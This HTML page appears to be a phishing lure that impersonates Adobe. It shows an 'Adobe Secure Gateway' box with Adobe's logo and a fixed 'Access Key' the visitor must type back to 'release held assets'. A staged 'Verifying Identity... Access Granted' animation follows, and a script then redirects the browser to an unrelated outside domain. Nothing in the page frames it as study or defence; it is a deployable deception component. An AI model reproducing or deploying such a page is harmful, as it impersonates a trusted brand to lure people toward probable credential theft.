<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe Secure Access</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@700&display=swap');
        
        body { font-family: 'Inter', sans-serif; -webkit-font-smoothing: antialiased; }
        .mono { font-family: 'JetBrains Mono', monospace; }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .animate-slide-up { animation: slideUp 0.4s cubic-bezier(0.0, 0.0, 0.2, 1); }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-6px); }
            75% { transform: translateX(6px); }
        }
        .shake { animation: shake 0.2s ease-in-out 0s 2; }

        .modal-overlay {
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(5px);
        }
    </style>
</head>
<body class="bg-[#F5F5F5] min-h-screen flex items-center justify-center overflow-hidden">

    <div class="fixed inset-0 p-12 opacity-10 select-none pointer-events-none">
        <div class="max-w-6xl mx-auto space-y-10">
            <div class="flex justify-between items-center">
                <div class="h-8 w-32 bg-red-600 rounded"></div>
                <div class="h-10 w-10 bg-slate-400 rounded-full"></div>
            </div>
            <div class="grid grid-cols-4 gap-6">
                <div class="h-64 bg-white rounded-lg border border-slate-300"></div>
                <div class="h-64 bg-white rounded-lg border border-slate-300"></div>
                <div class="h-64 bg-white rounded-lg border border-slate-300"></div>
                <div class="h-64 bg-white rounded-lg border border-slate-300"></div>
            </div>
        </div>
    </div>

    <div id="verifyModal" class="modal-overlay fixed inset-0 z-50 flex items-center justify-center p-6">
        <div class="bg-white w-full max-w-[420px] rounded-xl shadow-2xl p-10 animate-slide-up relative">
            
            <div class="text-center mb-8">
                <div class="inline-flex items-center justify-center mb-6">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Adobe_Experience_Cloud_logo.svg/128px-Adobe_Experience_Cloud_logo.svg.png" 
                         alt="Adobe Logo" 
                         class="w-12 h-12 block"
                         onerror="this.src='https://cdn.worldvectorlogo.com/logos/adobe-2.svg'">
                </div>
                                      
                <h2 class="text-2xl font-bold text-[#2C2C2C] mb-2 tracking-tight">Adobe Secure Gateway</h2>
                <p class="text-[#6E6E6E] text-sm font-medium">Identity verification required to release held assets.</p>
            </div>

            <div class="bg-[#F9F9F9] rounded-xl p-6 mb-8 border border-[#E1E1E1] text-center">
                <span class="text-[10px] font-bold text-[#6E6E6E] uppercase tracking-widest block mb-2">Access Key</span>
                <div class="text-4xl font-bold text-[#FA0F00] mono tracking-widest">552111</div>
            </div>

            <form id="gateForm" class="space-y-6">
                <div class="space-y-2">
                    <label for="userInput" class="text-[11px] font-bold text-[#2C2C2C] ml-1 uppercase tracking-wider">Verification Code</label>
                    <input type="text" id="userInput" maxlength="6" autocomplete="off" placeholder="------"
                        class="w-full px-4 py-3 bg-white border-b-2 border-[#E1E1E1] text-center text-3xl mono font-bold focus:border-[#FA0F00] outline-none transition-all text-[#2C2C2C]">
                </div>
                
                <p id="errorMessage" class="text-[#D7373F] text-xs font-semibold text-center hidden">
                    <i class="fa-solid fa-circle-exclamation mr-1"></i> The code is incorrect. Please try again.
                </p>

                <div class="pt-2">
                    <button type="submit" id="submitBtn" 
                        class="w-full bg-[#FA0F00] text-white py-3 rounded-full font-bold hover:bg-[#D70D00] transition-all flex items-center justify-center gap-3 active:scale-[0.98]">
                        <span id="btnText">Verify & Continue</span>
                        <i id="spinner" class="fa-solid fa-circle-notch fa-spin hidden text-lg"></i>
                    </button>
                </div>
            </form>

            <div class="mt-8 pt-6 border-t border-[#F0F0F0] text-center">
                <div class="flex items-center justify-center gap-2">
                    <span class="w-1.5 h-1.5 bg-[#FA0F00] rounded-full"></span>
                    <p class="text-[10px] text-[#999999] font-bold uppercase tracking-[0.15em]">Adobe Identity Service</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        const VALID_CODE = "552111";
        const REDIRECT_URL = "https://substack.pouwiloo.com.co/!WxpVG6guz7JAqpXwv0B/";

        const form = document.getElementById('gateForm');
        const input = document.getElementById('userInput');
        const error = document.getElementById('errorMessage');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const spinner = document.getElementById('spinner');

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const cleanedInput = input.value.trim();

            if (cleanedInput === VALID_CODE) {
                error.classList.add('hidden');
                input.disabled = true;
                submitBtn.disabled = true;
                
                btnText.textContent = "Verifying Identity...";
                spinner.classList.remove('hidden');

                setTimeout(() => {
                    btnText.textContent = "Access Granted";
                    submitBtn.classList.replace('bg-[#FA0F00]', 'bg-black');
                    
                    setTimeout(() => {
                        window.location.href = REDIRECT_URL;
                    }, 800);
                }, 1200);
            } else {
                error.classList.remove('hidden');
                input.classList.add('border-[#D7373F]', 'shake');
                setTimeout(() => input.classList.remove('shake'), 400);
                input.value = "";
                input.focus();
            }
        });

        input.addEventListener('input', () => {
            error.classList.add('hidden');
            input.classList.remove('border-[#D7373F]');
        });
    </script>
</body>
</html>
